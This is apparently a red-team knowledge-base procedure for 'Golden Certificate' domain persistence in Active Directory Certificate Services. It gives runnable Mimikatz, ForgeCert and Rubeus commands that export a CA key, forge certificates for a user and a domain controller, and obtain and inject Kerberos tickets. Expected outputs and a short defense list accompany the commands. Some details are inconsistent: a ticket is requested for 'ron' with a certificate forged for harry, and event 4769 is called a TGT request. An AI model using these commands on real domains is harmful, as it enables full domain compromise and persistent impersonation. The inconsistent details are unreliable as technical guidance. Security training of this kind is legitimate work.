---
id: cefc4a17-1724-4eb6-b9e3-d0d15a43aff8
name: Golden Certificate Domain Persistence
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:28.406454+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos
    Tickets]]
  - '[[techniques/Forge Web Credentials|T1606 - Forge Web Credentials]]'
sub_techniques:
  - >-
    [[sub-techniques/Domain Controller Certificate|T1558.004 - Domain Controller
    Certificate]]
  - '[[sub-techniques/Certificate Authority|T1606.002 - Certificate Authority]]'
tags:
  - '[[tags/Domain]]'
  - '[[tags/Golden Certificate]]'
  - '[[tags/Windows - Persistence]]'
commands:
  - '[[commands/mimikatz-export-local-machine-certificates]]'
  - '[[commands/forgecert-forge-ad-certificate]]'
  - '[[commands/rubeus-asktgt-with-certificate]]'
platforms:
  - Windows
tools:
  - '[[tools/Mimikatz]]'
  - '[[tools/Rubeus]]'
  - '[[tools/ForgeCert]]'
validated: true
---

# Golden Certificate Domain Persistence

## Summary

This procedure demonstrates how to achieve domain persistence by forging 'golden' certificates using a compromised Certificate Authority (CA) private key. Attackers export existing certificates, forge new ones for Active Directory users or computers, and use them to request Kerberos Ticket Granting Tickets (TGTs), enabling authentication bypass, lateral movement, and persistent access without standard credentials.

## Description

Golden Certificate attacks exploit Active Directory Certificate Services (AD CS) by leveraging a stolen CA certificate and private key to issue fraudulent certificates that mimic legitimate ones for domain entities. These forged certificates can be used with tools like Rubeus to obtain TGTs, allowing impersonation of any domain user or computer account. This technique is particularly effective in environments with misconfigured or vulnerable AD CS setups, providing long-term persistence and evasion of credential-based detections. The process assumes prior compromise of a domain-joined system with access to the CA's private key (e.g., via ESC1-ESC8 vulnerabilities or direct CA server access). Once forged, certificates enable seamless lateral movement to domain controllers or sensitive resources. Detection is challenging due to the legitimate appearance of the certificates, but monitoring for unusual certificate issuance or Kerberos authentication patterns can help mitigate.

## Requirements

1. Compromised access to a domain-joined Windows system with Domain Admin or equivalent privileges to reach the CA server.
2. Possession of the Enterprise CA's .pfx file containing the private key (e.g., obtained via Mimikatz or file extraction).
3. Tools: Mimikatz, ForgeCert.exe, and Rubeus.exe (pre-compiled binaries for Windows x64).
4. Target environment: Active Directory domain with AD CS deployed; network access to domain controllers for Kerberos requests.

## Defense

- Implement certificate pinning and strict issuance policies in AD CS; use Network Device Enrollment Service (NDES) restrictions.
- Monitor Event Logs for Event ID 4886 (certificate auto-enrollment) and 4769 (Kerberos TGT requests) with anomalous certificate subjects.
- Enable Certificate Revocation List (CRL) distribution and validate certificate paths in real-time.
- Regularly audit CA server access and private key protection; use Hardware Security Modules (HSMs) for CA keys.
- Deploy tools like Microsoft Defender for Identity to detect forged Kerberos tickets.

## Objectives

1. Export and prepare CA certificates from a compromised system.
2. Forge certificates for target AD users or computer accounts.
3. Request and validate Kerberos TGTs using forged certificates.
4. Establish persistent domain access for lateral movement and resource exfiltration.

## Instructions

### Step 1: Export Certificates from Local Machine Store

**Context**: Begin by using Mimikatz to enable debug privileges and export certificates from the local machine's personal store (My). This step prepares any existing CA-related certificates for forging and ensures access to the certificate store. Run Mimikatz as an administrator on a compromised domain-joined host.

**Command** ([[commands/mimikatz-export-local-machine-certificates]]):

```powershell
privilege::debug
crypto::capi
crypto::cng
crypto::certificates /systemstore:local_machine /store:my /export
```

> This sequence enables SeDebugPrivilege for store access, initializes CAPI and CNG providers, and exports all certificates from the Local Machine > Personal store to .der files in the current directory. Why: Exporting provides the base CA certificate (.pfx) needed for forging; without this, subsequent steps fail.

**Expected Output**: Mimikatz will list available certificates and export them as files like 'cert_1.der'. Look for the Enterprise CA certificate; convert to .pfx if needed using OpenSSL or certutil for ForgeCert input.

### Step 2: Forge Certificates for AD Entities

**Context**: Use ForgeCert to create forged .pfx certificates for a target user (e.g., a standard account) and computer (e.g., Domain Controller). This impersonates legitimate AD entities using the stolen CA private key. Provide the CA .pfx path, passwords, and SubjectAltName matching the target UPN or computer name.

**Command** ([[commands/forgecert-forge-ad-certificate]]):

For a user certificate (e.g., harry@lab.local):

```cmd
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123
```

For a computer certificate (e.g., DC$@lab.local):

```cmd
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123
```

> ForgeCert signs new certificates with the CA private key, embedding the specified SubjectAltName to match AD objects. Why: These forged certs allow certificate-based auth in Kerberos, bypassing password requirements. Run from any Windows host with the tool; if the SubjectAltName doesn't match an existing AD object, TGT requests may fail—verify with 'Get-ADUser' or similar.

**Expected Output**: Successful execution creates 'harry.pfx' and 'dc.pfx' files. Console output confirms: "Certificate created successfully" with details on the new cert's thumbprint and validity.

### Step 3: Request TGT with Forged Certificate

**Context**: Use Rubeus to authenticate to the domain controller and request a TGT for a target user (e.g., ron) using the forged user certificate. This validates the forgery and provides a Kerberos ticket for further actions like pass-the-ticket attacks.

**Command** ([[commands/rubeus-asktgt-with-certificate]]):

```cmd
Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123
```

> Rubeus performs PKINIT authentication with the certificate, requesting a TGT from the KDC. Why: The TGT enables impersonation of 'ron' across the domain; use the output ticket with 'ptt' for immediate access. If targeting a DC cert, adjust /user to the computer account.

**Expected Output**: Rubeus outputs a base64-encoded TGT ticket, e.g., "[Ticket Granting Ticket for ron@lab.local]", along with session key details. Success: No errors like "KDC_ERR_CLIENT_NAME_MISMATCH"; import with 'Rubeus.exe ptt /ticket:<base64>' for use.

**Success Indicators**:
- Exported .pfx files contain valid CA private key (verify with certutil -dump).
- Forged certs pass AD validation (no revocation errors in TGT request).
- TGT obtained allows access to domain resources (test with 'klist' or remote logon).
